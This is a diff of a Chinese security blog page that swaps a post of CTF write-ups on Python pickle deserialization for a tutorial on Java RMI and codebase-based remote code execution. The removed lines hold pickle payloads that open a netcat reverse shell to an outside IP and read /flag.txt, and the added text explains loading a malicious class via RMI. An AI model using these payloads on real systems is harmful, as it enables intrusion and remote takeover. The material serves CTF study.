@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || Python反序列化-wp</title>
+    <title>Hoylindo || Java-RMI</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -153,14 +153,14 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>Python反序列化-wp </h1>
+        <h1>Java-RMI </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2023/2/12
+            2023/8/19
         </span>
 
         
@@ -183,8 +183,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/Python" style=color:#1bccbc>
-                    Python
+                <a href="/tags/Java" style=color:#879cff>
+                    Java
                 </a>
             </span>
             
@@ -197,104 +197,146 @@
 
 <span id="more"></span>
 
-<h3 id="CTFSHOW-web277"><a href="#CTFSHOW-web277" class="headerlink" title="CTFSHOW-web277"></a>CTFSHOW-web277</h3><ul>
-<li><p>源码找到<code>&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</code></p>
+<ul>
+<li><p><code>RMI</code>全称是<code>Remote Method Invocation</code>，远程方法调用，从这个名字就可以看出，他的目标和RPC其实是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独有的⼀种机制</p>
 </li>
-<li><p>传入一个data，base64解码后反序列化</p>
+<li><p>RMI Server：</p>
+<pre><code class="java">package aaaa.rmi;
+
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+public class RMIServer &#123;
+    public interface IRemoteHelloWorld extends Remote &#123;
+        public String hello() throws RemoteException;
+    &#125;
+    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;
+        protected RemoteHelloWorld() throws RemoteException &#123;
+            super();
+        &#125;
+        public String hello() throws RemoteException &#123;
+            System.out.println(&quot;call from&quot;);
+            return &quot;Hello world&quot;;
+        &#125;
+    &#125;
+    private void start() throws Exception &#123;
+        RemoteHelloWorld h = new RemoteHelloWorld();
+        LocateRegistry.createRegistry(1099);
+        Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);
+    &#125;
+    public static void main(String[] args) throws Exception &#123;
+        new RMIServer().start();
+    &#125;
+&#125;
+</code></pre>
 </li>
-<li><p>没有回显，所以需要反弹shell：</p>
-<pre><code class="python">import base64
-import pickle
+<li><p>⼀个<code>RMI Server</code>分为三部分：</p>
+<ul>
+<li>⼀个继承了<code>java.rmi.Remote</code>的接⼝，其中定义我们要远程调⽤的函数，比如这里的<code>hello()</code></li>
+<li>⼀个实现了此接⼝的类</li>
+<li>⼀个主类，⽤来创建<code>Registry</code>，并将上⾯的类实例化后绑定到⼀个地址，这就是所谓的Server了</li>
+</ul>
+</li>
+<li><p>RMI Client：</p>
+<pre><code class="java">package aaaa.rmi;
 
+import java.rmi.Naming;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
 
-class shell(object):
-    def __reduce__(self):
-        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 43.143.175.158 6666 -e /bin/sh&#39;)&quot;,))
-
-k = shell()
-print(base64.b64encode(pickle.dumps(k)))
+public class RMIClient &#123;
+    public static void main(String[] args) throws Exception &#123;
+        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)
+                Naming.lookup(&quot;rmi://192.168.128.178:1099/Hello&quot;);
+        String ret = hello.hello();
+        System.out.println( ret);
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>使⽤<code>Naming.lookup</code>在<code>Registry</code>中寻找到名字是Hello的对象，后面的使用就和在本地使用⼀样了</p>
+</li>
+<li><p>一个RMI过程有以下三个参与者：<code>RMI Registry</code>、<code>RMI Server</code>、<code>RMI Client</code></p>
+</li>
+<li><p>通常我们在新建一个<code>RMI Registry</code>的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了<code>Registry</code>和<code>Server</code>两部分</p>
+<pre><code class="java">LocateRegistry.createRegistry(1099);  //创建并运行RMI Registry
+Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, new RemoteHelloWorld());  //行将RemoteHelloWorld对象绑定到Hello这个名字上
+</code></pre>
+</li>
+<li><p><code>Naming.bind</code>的第一个参数是一个URL，形如：<code>rmi://host:port/name</code>，其中，<code>host</code>和<code>port</code>就是<code>RMI Registry</code>的地址和端口，name是远程对象的名字</p>
+</li>
+<li><p>如果<code>RMI Registry</code>在本地运行，那么<code>host</code>和<code>port</code>是可以省略的，此时<code>host</code>默认是<code>localhost</code>，<code>port</code>默认是<code>1099</code>：</p>
+<pre><code class="java">Naming.bind(&quot;Hello&quot;, new RemoteHelloWorld());
 </code></pre>
 </li>
 </ul>
-<h3 id="CTFSHOW-web278"><a href="#CTFSHOW-web278" class="headerlink" title="CTFSHOW-web278"></a>CTFSHOW-web278</h3><ul>
-<li>提示过滤了<code>os.system</code>，换成<code>os.popen</code></li>
-<li>然后同上</li>
-</ul>
-<h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h3><ul>
-<li><p>打开是个什么商店的页面，随便买点东西抓个包，cookie很像base64，但是解出来是一团乱码</p>
+<h3 id="攻击RMI-Registry"><a href="#攻击RMI-Registry" class="headerlink" title="攻击RMI Registry"></a>攻击RMI Registry</h3><ul>
+<li><p>Java对远程访问<code>RMI Registry</code>做了限制，只有来源地址是<code>localhost</code>的时候，才能调用<code>rebind</code>、<code>bind</code>、<code>unbind</code>等方法</p>
 </li>
-<li><p>直接解码后反序列化：</p>
-<pre><code class="python">import pickle
-import base64
-
-enc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;
-
-print(pickle.loads(base64.b64decode(enc)))
+<li><p>不过<code>list</code>和<code>lookup</code>方法可以远程调用，<code>list</code>方法可以列出目标上所有绑定的对象：</p>
+<pre><code class="java">String[] s = Naming.list(&quot;rmi://192.168.128.178:1099&quot;);
 </code></pre>
 </li>
-<li><p>输出：<code>&#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&#125;</code></p>
-</li>
-<li><p>猜测后端肯定也有一个解码反序列化的过程，可以利用<code>__reduce__</code>执行命令</p>
-</li>
-<li><p>没有回显，考虑反弹shell：</p>
-<pre><code class="python">import base64
-import pickle
-
-
-class A(object):
-    def __reduce__(self):
-        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 43.143.175.158 6666 -e/bin/sh&#39;)&quot;,))
-
-
-a = A()
-print(base64.b64encode(pickle.dumps(a)))
-</code></pre>
+<li><p><code>lookup</code>作用就是获得某个远程对象，那么，只要目标服务器上存在一些危险方法，通过RMI就可以对其进行调用</p>
 </li>
 </ul>
-<h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><ul>
-<li><p>页面提示一定要买到 lv6，看源码可以看到<code>lv5.png</code>，然后写脚本找 <code>lv6.png</code>：</p>
-<pre><code class="python">import requests
-
-for i in range(2, 200):
-    url = &#39;http://30cb3120-98f3-4cda-bfe4-8ae632607648.node4.buuoj.cn:81/shop?page=&#39;
-    url += str(i)
-    r = requests.get(url)
-    # print(r.url)
-    # print(r.text)
-    if &#39;lv6.png&#39; in r.text:
-        print(r.url)
-        exit(1)
+<h3 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h3><ul>
+<li><p><code>Java Applet</code>是可以运行在浏览器中的，在使用<code>Applet</code>的时候通常需要指定一个<code>codebase</code>属性：</p>
+<pre><code class="html">&lt;applet code=&quot;HelloWorld.class&quot; codebase=&quot;Applets&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;
+&lt;/applet&gt;
 </code></pre>
 </li>
-<li><p>找到 lv6 在181页，访问，然后购买，抓包，折扣改的很小，返回这个页面：<code>/b1g_m4mber</code></p>
+<li><p>除了<code>Applet</code>，<code>RMI</code>中也存在远程加载的场景，也会涉及到<code>codebase</code>，<code>codebase</code>是一个地址，告诉Java虚拟机应该从哪个地方去搜索类，有点像<br><code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而<code>codebase</code>通常是远程URL，比如<code>http</code>、<code>ftp</code>等</p>
 </li>
-<li><p>显示只有admin可以访问，抓包看到cookie里有：<code>JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</code></p>
+<li><p>如果指定<code>codebase=http://example.com/</code>，然后加载<code>org.vulhub.example.Example</code>类，则Java虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为<code>Example</code>类的字节码</p>
 </li>
-<li><p>拿去解码，可以看到包含一个<code>username</code>，爆破得到密钥：<code>1Kun</code></p>
+<li><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类，如果某一端反序列化时发现一个对象，那么就会去自己的<code>CLASSPATH</code>下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类</p>
 </li>
-<li><p>伪造jwt访问，源码里可以找到：</p>
-<pre><code class="html">&lt;a href=&quot;/static/asd1f654e683wq/www.zip&quot; &gt;&lt;span style=&quot;visibility:hidden&quot;&gt;删库跑路前我留了好东西在这里&lt;/span&gt;&lt;/a&gt;
+<li><p>如果<code>codebase</code>被控制，就可以加载恶意类了</p>
+</li>
+<li><p>在RMI中，可以将<code>codebase</code>随着序列化数据一起传输，服务器在接收到这个数据后就会去<code>CLASSPATH</code>和指定的<code>codebase</code>寻找类，由于<code>codebase</code>被控制导致任意命令执行漏洞</p>
+</li>
+<li><p>漏洞条件：</p>
+<ul>
+<li>安装并配置了<code>SecurityManager</code></li>
+<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code></li>
+<li>在<code>java.rmi.server.useCodebaseOnly</code>配置为 true 的情况下，Java虚拟机将只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取</li>
+</ul>
+</li>
+<li><p>看着P神的文章想跟着复现一下不知道抽什么风一直报错，放弃了，我选择嗯看</p>
+</li>
+<li><p>研究一下他的源码，大概意思就是，先起一个<code>RMIServer</code>，在编译运行的时候设置三个参数：</p>
+<pre><code class="java">java.rmi.server.hostname=192.168.135.142 //是服务器的IP地址，远程调用时需要根据这个值来访问RMI Server
+java.rmi.server.useCodebaseOnly=false //支持从RMI请求中获取Codebase
+java.security.policy=client.policy //授权
 </code></pre>
 </li>
-<li><p>下载源码，在<code>admin.py</code>里找到一处反序列化：</p>
-<pre><code class="python">become = self.get_argument(&#39;become&#39;)
-p = pickle.loads(urllib.unquote(become))
+<li><p>再建立一个RMIClient.java，在另一个位置运行，此时<code>RMI Server</code>在本地<code>CLASSPATH</code>里找不到类，会去加载<code>Codebase</code>中的类</p>
+<pre><code class="java">import java.rmi.Naming;
+import java.util.List;
+import java.util.ArrayList;
+import java.io.Serializable;
+public class RMIClient implements Serializable &#123;
+    public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;
+    public void lookup() throws Exception &#123;
+        ICalc r = (ICalc)
+                Naming.lookup(&quot;rmi://192.168.135.142:1099/refObj&quot;);
+        List&lt;Integer&gt; li = new Payload();
+        li.add(3);
+        li.add(4);
+        System.out.println(r.sum(li));
+    &#125;
+    public static void main(String[] args) throws Exception &#123;
+        new RMIClient().lookup();
+    &#125;
+&#125;
 </code></pre>
 </li>
-<li><p>f12把hidden去掉，然后抓包传：<code>become=ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.</code>，拿到flag</p>
+<li><p>查看<code>example.com</code>的日志，慧收到了来自Java的请求<code>/RMIClient$Payload.class</code>，因为还没有实际放置这个类文件，所以会出现异常</p>
 </li>
-<li><p>exp：</p>
-<pre><code class="python">import commands
-import urllib
-import pickle
-class Try(object):
-    def __reduce__(self):
-        return (commands.getoutput, (&#39;cat /flag.txt&#39;,))
-
-
-a = Try()
-print(urllib.quote(pickle.dumps(a)))
-</code></pre>
+<li><p>只需要编译一个恶意类，将其class文件放置在Web服务器的<code>/RMIClient$Payload.class</code>即可</p>
 </li>
 </ul>
 
